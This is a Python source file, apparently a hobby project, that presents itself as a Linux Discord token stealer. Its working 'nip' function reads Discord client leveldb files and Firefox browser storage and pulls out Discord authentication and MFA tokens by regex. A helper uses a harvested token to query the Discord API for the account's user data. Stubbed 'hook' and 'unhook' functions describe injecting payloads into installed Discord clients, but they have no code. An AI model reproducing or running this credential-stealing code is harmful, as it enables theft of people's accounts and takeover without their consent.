# Nips token from leveldb
# Created by Zackery .R. Smith | github.com/ZackeryRSmith
# Why does nobody create a linux token grabber...

from os import path, listdir
from re import findall
from typing import (
    Optional,
    Any
)
import sqlite3
from requests import get


##################################
# CONSTANTS
##################################

HOME = path.expanduser("~")+"/"
CONFIG = HOME + ".config/" 
PATHS = {
    "Discord"           : CONFIG   + "discord/",
    "Discord Canary"    : CONFIG   + "discordcanary/",
    "Discord PTB"       : CONFIG   + "discordptb/",
    "Google Chrome"     : CONFIG   + "google-chrome/Default/",
    "Firefox"           : HOME     + ".mozilla/firefox/"
    #"Opera"             : CONFIG   + "opera/",
    #"Brave"             : LOCAL    + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
}
API = "https://discordapp.com/api/v9/"  # Discord API to use


###############################################
# DISCORD API CONTROL
###############################################

##################################
# GET HEADERS
##################################

def get_headers(token: Optional[str]=None, content_type: Optional[str]="application/json"):
    """
    Generate headers

    :param str token: Token; Client secret, OAuth token. Used when Auth is needed to make a request
    :param str content_type: They type of content getting sent to Discords API
    """
    headers = {
        "Content-Type": content_type,
        # User agent from https://techblog.willshouse.com/2012/01/03/most-common-user-agents/
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    }
    if token != None: headers.update({"Authorization": token}) 
    return headers


##################################
# GET USER DATA
##################################

def get_user_data(token: str):
    """
    Fetch simple user data via https://discord.com/developers/docs/resources/user#get-user

    :param str token: Token for authentication when making a request
    """
    return get(API+"users/@me", headers=get_headers(token)).json()


###############################################
# TOKEN STEALER
###############################################

##################################
# NIP
##################################

def nip():
    """ Nips token from leveldb (Or SQLite) """
    tokens = []
    for platform, loc in PATHS.items():
        if platform == "Firefox":
            ## Unlike Chromium based browsers which use leveldb, Firefox uses SQLite.
            ## Because of this we must deal with Firefox as a whole other thing
            # Get all profiles
            profiles = [x for x in listdir(loc) if "default" in x]
            for profile in profiles:
                # Check if "webappsstore.sqlite" exists
                if "webappsstore.sqlite" in listdir(loc+"/"+profile+"/"):
                    database = loc+"/"+profile+"/webappsstore.sqlite"
                    # Try to connect to sqlite database
                    conn = None
                    try:
                        conn = sqlite3.connect(database)
                    except:
                        continue  # An issue has come up connecting to database (It may be corrupted)
                    finally:
                        if conn:
                            # Create cursor and get all rows
                            cur = conn.cursor()
                            cur.execute("SELECT * FROM webappsstore2")
                            rows = cur.fetchall()
                            # Get every row in the table 
                            for row in rows:
                                # Sort trough row to find token
                                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                    # Loop trough all tokens found
                                    for token in findall(regex, str(row)):
                                        # Stop duplicates
                                        if not token in tokens:
                                            tokens.append(token)
        else:
            # Loc = Path | Switched to allow `path` (OS Module)
            loc += "/Local Storage/leveldb"
            # Check if leveldb exists
            if path.exists(loc):
                # Get every file
                for file_name in listdir(loc):
                    # Get all files a token can be located in
                    if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                        # Get every line and clean it slightly (To a RegEx-able state)
                        for line in [x.strip() for x in open(f"{loc}/{file_name}", errors="ignore").readlines() if x.strip()]:
                            # Sort trough line to find token
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                # Loop through all tokens found
                                for token in findall(regex, line):
                                    # Stop duplicates
                                    if not token in tokens:
                                        tokens.append(token)
    return tokens


###############################################
# HOOK
###############################################

def hook(payload: Any="", parent: Optional[bool]=True):
    """
    Injects payload into all installed discord clients (Unless specified)
    
    :: NOTE
    : This does change core discord librarys, to revert back use `unhook()`!

    :param any payload: May be a file or an url to raw text
    :param bool parent: If true a script will watch the injection to make sure everything goes well
    """
    pass


###############################################
# UNHOOK
###############################################

def unhook():
    """
    Unhooks any payload that was injected, will also kill the "parent" (if enabled). This will also stop the payload from rehooking.
    """
    pass

